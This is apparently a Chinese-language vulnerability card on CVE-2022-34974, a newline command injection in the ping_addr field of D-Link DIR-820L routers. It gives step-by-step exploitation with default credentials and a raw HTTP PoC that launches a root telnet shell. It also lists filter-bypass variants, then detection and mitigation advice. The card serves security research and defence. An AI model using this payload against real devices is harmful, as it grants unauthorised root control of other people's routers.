---
id: iot-dlink-dir820l-ping-ccp-ping-addr-command-injection
title: D-Link DIR-820L /ping.ccp ping_addr 换行注入 ncc2 doPingV6（CVE-2022-34974）
type: scenario
domain: iot
path: iot
technique: dlink-dir820l-tools-vct-asp-ping-ccp-ping-addr-ncc2-dopingv6-system-command-injection
aliases:
- CVE-2022-34974
- DIR-820LA1_FW102B22
- tools_vct.asp
- ping.ccp
- ping_addr
- ccp_act=ping_v4
- doPingV6
- ncc2 命令注入
- D-Link 路由器命令执行
tags:
- iot
- dlink
- router
- firmware
- command-injection
- cve-2022-34974
- ncc2
- mips
- authenticated
- telnet
cve:
- CVE-2022-34974
affected_versions: D-Link DIR-820LA1_FW102B22（原文引用阿里云漏洞库标注；原文复现使用 DIR820LA1_FW105B03）
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V285
  verified_at: '2026-11-08T05:27:59+08:00'
  notes: 已对照原文与29张图逐项核对：图24-25 tools_vct.asp Ping 构造 url=ping.ccp&ping_addr；图26 get_entry_value_by_name(ping_addr)+同一五字符 strpos 过滤+_system(ping.c,403,doPingV6)；图27 原始 POST /ping.ccp ping_addr=%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a；图28 telnet 192.168.0.1 7080 得到 root shell；图29 阿里云漏洞库 CVE-2022-34974（DIR-820LA1_FW102B22）。均与卡片一致。dedup 与同文 DeviceName 卡判 likely_duplicate，裁决为并列保留：不同 CVE、不同入口/参数、不同 sink 模板(doPingV6 vs flash set DEVICE_NAME)，仅共用黑名单与换行绕过，不属同一利用链；两卡已互链。versions 按原文引用 DIR-820LA1_FW102B22 且注明实测固件 105B03，保留。未本地复跑 PoC。
---

## 一句话结论

D-Link DIR-820L 登录后，`tools_vct.asp` 的 Ping 功能把目标地址以 `ccp_act=ping_v4&ping_addr=` 提交到 `/ping.ccp`；`ncc2` 取出 `ping_addr` 后做与 DeviceName 相同的黑名单检查（反引号、反斜杠、分号、双引号、竖线），未过滤换行，随后调用 `_system()`（`ping.c:403`、`doPingV6`），因此 `%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a` 可在 7080 端口开启 root telnet shell；该 ping_addr 命令注入即 CVE-2022-34974。

## 原理

- **前端取值与提交**：`tools_vct.asp` 的 Ping 功能构造 `paramPing = { url: "ping.ccp", arg: 'ccp_act=ping_v4&ping_addr=' + $('#ping_ipaddr').val() }`，即 ping 目标完全由输入框内容拼入请求体后 POST 到 `ping.ccp`。
- **后端处理**：`ping.ccp` 同样不是独立 CGI，而由 ncc2 处理。伪代码显示 `get_entry_value_by_name(..., "ping_addr")` 取出该参数，随后做与 DeviceName 入口相同的一组 `strpos` 检查：反引号、反斜杠、分号、双引号、竖线任一命中即拒绝；全部不命中时执行 `_system("/opt/release/zoo_2.0/cameo/private/app/ncc2/cgi/ccp/ping.c", 403, "doPingV6", ...)`。
- **为什么能注入**：黑名单只覆盖五个字符，换行（0x0a）不在其中；`_system` 最终把命令交给 `/bin/sh -c` 解析，换行把原始 ping 命令行与注入的 `telnetd` 命令分隔开。文章截图只展示到 `_system` 调用，未展开 `doPingV6` 内部完整的命令模板，但实际发送后成功连上 shell，证明 `ping_addr` 确实进入了 shell 命令。
- **认证要求**：需要已登录管理员会话，原始请求携带 Cookie `hasLogin=1`（原文环境默认 Admin / 空密码）。

## 触发条件

- 目标为 D-Link DIR-820L/DIR-820LA1 固件；原文复现固件为 `DIR820LA1_FW105B03`，所引阿里云漏洞库条目标注受影响版本 `DIR-820LA1_FW102B22`，厂商当时暂无补丁。
- 需要有效管理员会话（`hasLogin=1`）。
- `ping_addr` 值不得含反引号、反斜杠、分号、双引号、竖线；用 URL 编码换行 `%0a` 分隔命令。
- 设备 BusyBox telnetd 可用，所选端口（原文 7080）未被占用或防火墙拦截。

## 利用步骤

1. 访问 `http://192.168.0.1/login.asp`，用默认 Admin / 空密码登录。
2. 打开 Tools → Ping 页面（`tools_vct.asp`），或直接构造 `/ping.ccp` 请求。
3. 在代理中拦截原始 `/ping.ccp` 请求，把 `ping_addr` 改为 `%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a` 后 Forward（与 DeviceName 链相同，避免多次重放）。
4. 等待片刻后执行 `telnet 192.168.0.1 7080`，连接后直接得到 `#` root shell（原文截图确认）。
5. 若 7080 被占用可换端口；若 telnetd 参数不兼容，可改用 `%0a` 后接其他带外/反弹命令验证。

## PoC

原文的最小请求形态（Burp 拦截到的原始 POST）：

```http
POST /ping.ccp HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: hasLogin=1

ccp_act=ping_v4&ping_addr=%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a&1723979700554=1723979700554
```

```bash
telnet 192.168.0.1 7080
# 连接后直接是 # root shell
```

原文未提供自动化脚本，上述原始请求即其最小 PoC。仅限授权环境使用。

## 变体与关联

- 绕过变体：与 DeviceName 入口共用同一过滤逻辑，`$()`、`&`、冒号、`>` 等未被检查；除 `%0a` 外也可尝试 `$(cmd)`、`&cmd` 形式（本入口原文验证的是 `%0a`）。
- 同一固件第一条链：`/get_set.ccp` 的 `lanHostCfg_DeviceName_1.1.1.0`（CVE-2022-26258），见 [[iot-dlink-dir820l-get-set-device-name-command-injection]]。两条链共用 ncc2 的 `_system` 与同类黑名单，但入口、参数与 CVE 不同。
- 编号说明：原文准备提交 CNVD 时查询阿里云漏洞库，发现 Ping_addr 命令注入已被登记为 CVE-2022-34974（标注 `DIR-820LA1_FW102B22`），因此未再提交。
- 关联 D-Link 命令注入卡：[[iot-dlink-dir615-645-815-service-cgi-event-command-injection]]、[[iot-dlink-di8100-upgrade-filter-asp-path-command-injection]]。

## 检测与防御

- 检测：`POST /ping.ccp` 的 `ping_addr` 含换行 `%0a`、`$(`、`&` 等 shell 元字符；`ncc2` 派生 `telnetd`/`sh` 子进程；设备在 23/7080 等端口出现非预期监听。
- 修复：升级厂商固件（该 CVE 条目原文称厂商暂无补丁，需关注 D-Link 安全公告）；管理面仅限内网/可信网段；禁止空口令。
- 代码层：ping 目标必须按 IP/域名白名单校验，禁止把参数拼进 shell；改用 `execve` 传 argv；过滤控制字符与全部 shell 元字符，而非五字符黑名单。
